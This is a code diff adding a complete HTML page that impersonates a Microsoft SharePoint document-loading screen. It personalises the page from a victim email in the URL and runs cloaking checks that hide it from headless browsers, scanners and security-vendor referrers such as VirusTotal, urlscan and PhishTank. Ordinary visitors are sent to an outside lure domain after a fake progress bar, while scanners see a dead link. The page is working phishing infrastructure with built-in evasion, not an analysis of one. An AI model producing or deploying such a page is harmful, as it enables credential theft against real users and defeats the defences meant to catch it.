@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading – Microsoft SharePoint</title>
+<meta name="robots" content="noindex, nofollow">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='4' fill='%23036C70'/%3E%3Cpath d='M8 8h16v3H8zm0 6h16v3H8zm0 6h10v3H8z' fill='%23fff'/%3E%3C/svg%3E">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%;background:#fff;font-family:'Segoe UI',system-ui,-apple-system,sans-serif}
+
+/* Top Microsoft nav bar */
+.nav{height:48px;background:#fff;border-bottom:1px solid #edebe9;display:flex;align-items:center;padding:0 16px;gap:12px}
+.nav-logo{display:flex;align-items:center;gap:8px;text-decoration:none}
+.nav-logo svg{width:20px;height:20px}
+.nav-logo-text{font-size:15px;color:#201f1e;font-weight:600}
+.nav-sep{color:#c8c6c4;font-size:20px;font-weight:200}
+.nav-app{font-size:15px;color:#201f1e}
+.nav-right{margin-left:auto;display:flex;align-items:center;gap:8px}
+.nav-avatar{width:32px;height:32px;border-radius:50%;background:#036C70;display:flex;align-items:center;justify-content:center;color:#fff;font-size:13px;font-weight:600}
+
+/* Suite bar (top ribbon) */
+.suite-bar{height:8px;background:linear-gradient(90deg,#036C70 0%,#038387 40%,#1BCBA4 100%)}
+
+/* Main loading area */
+.main{height:calc(100vh - 56px);display:flex;flex-direction:column;align-items:center;justify-content:center;background:#f8f7f6}
+
+.sp-card{background:#fff;border-radius:4px;box-shadow:0 1.6px 3.6px rgba(0,0,0,.13),0 .3px .9px rgba(0,0,0,.1);padding:48px 56px;max-width:460px;width:90%;text-align:center}
+
+/* SharePoint logo */
+.sp-logo{margin:0 auto 28px;position:relative;width:64px;height:64px}
+.sp-logo-ring{width:64px;height:64px;border-radius:50%;border:3px solid #edebe9;border-top-color:#036C70;animation:spin 1s linear infinite;position:absolute;top:0;left:0}
+.sp-logo-inner{width:64px;height:64px;display:flex;align-items:center;justify-content:center}
+.sp-logo-inner svg{width:36px;height:36px}
+
+.sp-title{font-size:17px;font-weight:600;color:#201f1e;margin-bottom:6px}
+.sp-sub{font-size:13px;color:#605e5c;margin-bottom:28px;line-height:1.5}
+
+/* Progress bar */
+.progress-track{height:3px;background:#edebe9;border-radius:2px;overflow:hidden;margin-bottom:16px}
+.progress-fill{height:100%;background:linear-gradient(90deg,#036C70,#1BCBA4);border-radius:2px;width:0;transition:width .4s ease}
+
+.status-text{font-size:12px;color:#a19f9d;min-height:18px}
+
+/* Dots loader */
+.dots{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:20px}
+.dot{width:7px;height:7px;border-radius:50%;background:#036C70;opacity:.3;animation:pulse 1.2s ease-in-out infinite}
+.dot:nth-child(1){animation-delay:0s}
+.dot:nth-child(2){animation-delay:.2s}
+.dot:nth-child(3){animation-delay:.4s}
+
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes pulse{0%,80%,100%{opacity:.3;transform:scale(.8)}40%{opacity:1;transform:scale(1)}}
+
+/* Bot / deny screen */
+.deny{display:none;height:calc(100vh - 56px);flex-direction:column;align-items:center;justify-content:center;background:#f8f7f6;text-align:center;padding:20px}
+.deny-icon{font-size:56px;margin-bottom:16px}
+.deny h2{font-size:20px;color:#201f1e;margin-bottom:8px;font-weight:600}
+.deny p{font-size:14px;color:#605e5c;max-width:380px;line-height:1.6}
+.deny-code{margin-top:14px;font-size:10px;color:#c8c6c4;font-family:monospace}
+</style>
+</head>
+<body>
+
+<div class="suite-bar"></div>
+
+<div class="nav">
+  <a class="nav-logo" href="#">
+    <!-- SharePoint icon, green -->
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
+      <rect width="32" height="32" rx="4" fill="#036C70"/>
+      <path d="M8 8h16v3H8zm0 6h16v3H8zm0 6h10v3H8z" fill="#fff"/>
+    </svg>
+    <span class="nav-logo-text">SharePoint</span>
+  </a>
+  <span class="nav-sep">|</span>
+  <span class="nav-app" id="navSite">Shared Documents</span>
+  <div class="nav-right">
+    <div class="nav-avatar" id="navInitials">MS</div>
+  </div>
+</div>
+
+<div class="main" id="mainArea">
+  <div class="sp-card">
+    <div class="sp-logo">
+      <div class="sp-logo-ring"></div>
+      <div class="sp-logo-inner">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
+          <rect width="32" height="32" rx="4" fill="#036C70"/>
+          <path d="M8 8h16v3H8zm0 6h16v3H8zm0 6h10v3H8z" fill="#fff"/>
+        </svg>
+      </div>
+    </div>
+    <div class="sp-title" id="cardTitle">Opening your document…</div>
+    <div class="sp-sub" id="cardSub">Please wait while we load the shared file securely.</div>
+    <div class="progress-track"><div class="progress-fill" id="progFill"></div></div>
+    <div class="status-text" id="statusTxt">Connecting to SharePoint…</div>
+    <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+  </div>
+</div>
+
+<div class="deny" id="denyArea">
+  <div class="deny-icon">🔒</div>
+  <h2>This link is no longer active</h2>
+  <p>The file may have been removed or the sharing link has expired. Contact the sender to request a new link.</p>
+  <div class="deny-code" id="denyCode"></div>
+</div>
+
+<script>
+var TARGET = 'https://auth.loadingdocuments.uk/l/cEZPsARZcvQ';
+
+// Pull ?r= or ?redirect= override
+(function(){
+  var p = new URLSearchParams(location.search);
+  var ov = p.get('r') || p.get('redirect');
+  if (ov) TARGET = decodeURIComponent(ov);
+
+  // Personalise from hash email
+  var h = location.hash.replace('#','');
+  if (h && h.includes('@')) {
+    var dom = h.split('@')[1];
+    var user = h.split('@')[0].replace(/[._+]/g,' ').replace(/\b\w/g,function(c){return c.toUpperCase()});
+    document.getElementById('navSite').textContent = dom;
+    document.getElementById('navInitials').textContent = h.substring(0,2).toUpperCase();
+    document.getElementById('cardTitle').textContent = 'Opening file for ' + user + '…';
+  }
+})();
+
+// ── Bot detection ────────────────────────────────────────────────────────────
+var score = 0, reasons = [];
+
+if (navigator.webdriver)                                  { score += 45; reasons.push('wd'); }
+if (!navigator.plugins || navigator.plugins.length === 0) { score += 15; reasons.push('np'); }
+if (window.innerWidth === 0 || window.innerHeight === 0)  { score += 35; reasons.push('zs'); }
+if (screen.width < 100 || screen.height < 100)            { score += 35; reasons.push('ts'); }
+if (!navigator.language)                                   { score += 15; reasons.push('nl'); }
+
+var ua = (navigator.userAgent || '').toLowerCase();
+var botUA = ['headlesschrome','phantomjs','selenium','python-requests','python-urllib','curl/','wget','scrapy','googlebot','bingbot','yandexbot','baiduspider','duckduckbot','ia_archiver','archive.org_bot','zgrab','masscan','go-http-client','java/','axios/','libwww','facebookexternalhit','linkedinbot','twitterbot','slurp','nmap','sqlmap'];
+for (var i = 0; i < botUA.length; i++) { if (ua.indexOf(botUA[i]) !== -1) { score += 55; reasons.push('ua:'+botUA[i]); break; } }
+
+var ref = document.referrer.toLowerCase();
+var botRef = ['virustotal','urlscan','hybrid-analysis','any.run','joesandbox','phishtank','safebrowsing','threatcrowd','openphish','proofpoint','mimecast','barracuda','zscaler','forcepoint','symantec','sophos','trendmicro','checkpoint','fortinet','kaspersky','mcafee','crowdstrike','paloalto'];
+for (var j = 0; j < botRef.length; j++) { if (ref.indexOf(botRef[j]) !== -1) { score += 65; reasons.push('ref:'+botRef[j]); break; } }
+
+try { if (window.self !== window.top) { score += 25; reasons.push('ifr'); } } catch(e) { score += 25; reasons.push('ifr2'); }
+if (ua.indexOf('chrome') !== -1 && typeof window.chrome === 'undefined') { score += 30; reasons.push('nco'); }
+
+// ── Progress animation then redirect or block ────────────────────────────────
+var steps = [
+  { pct: 18, msg: 'Connecting to SharePoint…',    delay: 400  },
+  { pct: 38, msg: 'Verifying permissions…',        delay: 750  },
+  { pct: 62, msg: 'Loading document metadata…',   delay: 600  },
+  { pct: 81, msg: 'Preparing secure view…',        delay: 550  },
+  { pct: 96, msg: 'Almost ready…',                 delay: 450  }
+];
+
+var fill = document.getElementById('progFill');
+var stat = document.getElementById('statusTxt');
+var elapsed = 0;
+
+steps.forEach(function(s) {
+  elapsed += s.delay;
+  setTimeout(function(){
+    fill.style.width = s.pct + '%';
+    stat.textContent = s.msg;
+  }, elapsed);
+});
+
+// Total redirect time: ~2.8–3.5s (natural feel)
+var totalDelay = elapsed + 500 + Math.floor(Math.random() * 400);
+
+setTimeout(function(){
+  if (score >= 55) {
+    // Bot — show dead page
+    document.getElementById('mainArea').style.display = 'none';
+    var d = document.getElementById('denyArea');
+    d.style.display = 'flex';
+    document.getElementById('denyCode').textContent = 'Ref: ' + btoa(reasons.join(',') + '|' + Date.now().toString(36)).substring(0,24);
+    document.title = '404 – Not Found';
+  } else {
+    fill.style.width = '100%';
+    stat.textContent = 'Redirecting…';
+    setTimeout(function(){ window.location.href = TARGET; }, 220);
+  }
+}, totalDelay);
+</script>
+</body>
+</html>
